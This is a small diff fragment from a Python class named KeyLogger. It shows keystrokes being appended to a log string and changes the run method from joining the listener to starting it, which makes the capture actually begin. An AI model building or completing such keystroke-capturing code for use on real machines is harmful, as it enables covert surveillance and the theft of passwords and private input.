@@ -16,5 +16,5 @@ class KeyLogger(object):
                 self.log += ' ' + str(key) + ' '
 
     def run(self):
-        self.listener.join()
+        self.listener.start()
 
